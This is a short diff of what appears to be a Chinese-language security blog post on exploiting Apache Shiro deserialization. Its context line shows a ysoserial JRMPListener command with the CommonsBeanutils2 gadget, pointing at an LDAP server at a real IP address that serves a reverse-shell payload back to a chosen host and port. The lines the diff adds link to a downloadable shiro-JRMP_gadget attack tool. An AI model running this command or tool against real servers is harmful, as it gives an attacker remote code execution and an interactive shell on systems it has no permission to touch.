@@ -75,3 +75,9 @@ Host: ip
 java -cp ysoserial-0.0.6-SNAPSHOT-1.8.3.jar  ysoserial.exploit.JRMPListener 8088 CommonsBeanutils2 "ldap://1.116.32.76:1389/Basic/Command/ReverseShell/{ip}/{port}"
 ```
 
+
+
+## 工具下载地址：
+
+[shiro-JRMP_gadget](https://github.com/SummerSec/BlogParpers/releases/download/shiro/shiro-JRMP_gadget.zip)
+
